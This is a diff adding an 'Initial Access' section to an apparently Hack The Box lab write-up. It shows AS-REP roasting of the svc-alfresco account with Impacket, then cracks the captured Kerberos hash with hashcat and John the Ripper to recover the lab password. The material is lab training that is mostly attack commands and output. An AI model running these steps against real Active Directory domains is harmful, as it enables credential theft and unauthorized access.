@@ -629,3 +629,118 @@ userPrincipalName: santi@htb.local
 [*] Bye!
 ```
 
+# **Initial Access**
+
+During the enumeration of users we discovered a service account, *svc-alfresco*.
+Researching that service we see that the service requires the service account to have *pre-authentication required* disabled, making this account susceptible to ASREPROAST attacks!
+
+## Acquire TGT for *svc-alfresco*
+
+```bash
+┌─[us-dedivip-1]─[10.10.14.63]─[lemagickonch@htb-pukfvgtk0k]─[~/Desktop]
+└──╼ [★]$ python GetNPUsers.py htb.local/svc-alfresco -format hashcat -outputfile hashes.asreproast
+Impacket v0.13.0.dev0+20240916.171021.65b774d - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+[*] Cannot authenticate svc-alfresco, getting its TGT
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:bd6dc292cf1b334b264e7395fae24749$feb8f3f05489dae2b4f2bdee81889f19191c211bf7304948671bfec6bd08c7f59b30e1b0b45d2692994b192a30bce0d6011bcdd809b0388cb104abae25b34c1714e8556aef891f4771d49b58fb2c9e57fb2d5c445eccb47133ba1810e9c4480cf0f2001e7c76de5e0d43a3c5bdbd086a226a69af2d0db92bc6c261d61771ebefb6e30e2445734b5512dbfc75b4166a6474220e5cfffbca7ed4e3d5393ccbcb705367492c19d4d27b4a8886918cf325a21e051fc48dbbbf9af3b0bf796e155d48a8759b77823d5ecd12f976aa12c29458b96fe329441586232397561b5cfaa7779a1438204470
+```
+Now that we have a TGT for the *svc-alfresco* account, we can attempt to crack the hash!
+
+## Cracking TGT Hash
+
+First lets save the hash to a file:
+```bash
+┌─[us-dedivip-1]─[10.10.14.63]─[lemagickonch@htb-pukfvgtk0k]─[~/Desktop]
+└──╼ [★]$ echo "\$krb5asrep\$23\$svc-alfresco@HTB.LOCAL:bd6dc292cf1b334b264e7395fae24749\$feb8f3f05489dae2b4f2bdee81889f19191c211bf7304948671bfec6bd08c7f59b30e1b0b45d2692994b192a30bce0d6011bcdd809b0388cb104abae25b34c1714e8556aef891f4771d49b58fb2c9e57fb2d5c445eccb47133ba1810e9c4480cf0f2001e7c76de5e0d43a3c5bdbd086a226a69af2d0db92bc6c261d61771ebefb6e30e2445734b5512dbfc75b4166a6474220e5cfffbca7ed4e3d5393ccbcb705367492c19d4d27b4a8886918cf325a21e051fc48dbbbf9af3b0bf796e155d48a8759b77823d5ecd12f976aa12c29458b96fe329441586232397561b5cfaa7779a1438204470
+" > alfresco.hash
+```
+
+**NOTE:** Before trying to crack the hash, we could use the password policy in the domain to narrow our password list entries to increase efficiency, but for this machine we do not need to.
+
+### Hashcat
+
+```bash
+┌─[us-dedivip-1]─[10.10.14.63]─[lemagickonch@htb-pukfvgtk0k]─[~/Desktop]
+└──╼ [★]$ hashcat -m 18200 -a 0 alfresco.hash /usr/share/wordlists/rockyou.txt 
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+==================================================================================================================================================
+* Device #1: pthread-haswell-AMD EPYC 7543 32-Core Processor, skipped
+
+OpenCL API (OpenCL 2.1 LINUX) - Platform #2 [Intel(R) Corporation]
+==================================================================
+* Device #2: AMD EPYC 7543 32-Core Processor, 3919/7902 MB (987 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Host memory required for this attack: 1 MB
+
+Dictionary cache built:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344392
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+* Runtime...: 1 sec
+
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:bd6dc292cf1b334b264e7395fae24749$feb8f3f05489dae2b4f2bdee81889f19191c211bf7304948671bfec6bd08c7f59b30e1b0b45d2692994b192a30bce0d6011bcdd809b0388cb104abae25b34c1714e8556aef891f4771d49b58fb2c9e57fb2d5c445eccb47133ba1810e9c4480cf0f2001e7c76de5e0d43a3c5bdbd086a226a69af2d0db92bc6c261d61771ebefb6e30e2445734b5512dbfc75b4166a6474220e5cfffbca7ed4e3d5393ccbcb705367492c19d4d27b4a8886918cf325a21e051fc48dbbbf9af3b0bf796e155d48a8759b77823d5ecd12f976aa12c29458b96fe329441586232397561b5cfaa7779a1438204470:s3rvice
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
+Hash.Target......: $krb5asrep$23$svc-alfresco@HTB.LOCAL:bd6dc292cf1b33...204470
+Time.Started.....: Wed Jan  1 09:16:45 2025 (2 secs)
+Time.Estimated...: Wed Jan  1 09:16:47 2025 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#2.........:  1914.9 kH/s (0.88ms) @ Accel:512 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 4085760/14344385 (28.48%)
+Rejected.........: 0/4085760 (0.00%)
+Restore.Point....: 4083712/14344385 (28.47%)
+Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#2....: s523480 -> s3r3ndipit
+
+Started: Wed Jan  1 09:16:37 2025
+Stopped: Wed Jan  1 09:16:48 2025
+```
+
+### John the Ripper
+
+```bash
+┌─[us-dedivip-1]─[10.10.14.63]─[lemagickonch@htb-pukfvgtk0k]─[~/Desktop]
+└──╼ [★]$ john alfresco.hash --fork=4 -w=/usr/share/wordlists/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
+Node numbers 1-4 of 4 (fork)
+Press 'q' or Ctrl-C to abort, almost any other key for status
+s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)     
+4 1g 0:00:00:02 DONE (2025-01-01 09:19) 0.3831g/s 391350p/s 391350c/s 391350C/s s3urkf2m..s3rvice
+3 0g 0:00:00:09 DONE (2025-01-01 09:19) 0g/s 391477p/s 391477c/s 391477C/sa6_123
+2 0g 0:00:00:09 DONE (2025-01-01 09:19) 0g/s 391050p/s 391050c/s 391050C/s   tania.abygurl69
+1 0g 0:00:00:09 DONE (2025-01-01 09:19) 0g/s 390200p/s 390200c/s 390200C/s    qaz.ie168
+Waiting for 3 children to terminate
+Session completed. 
+```
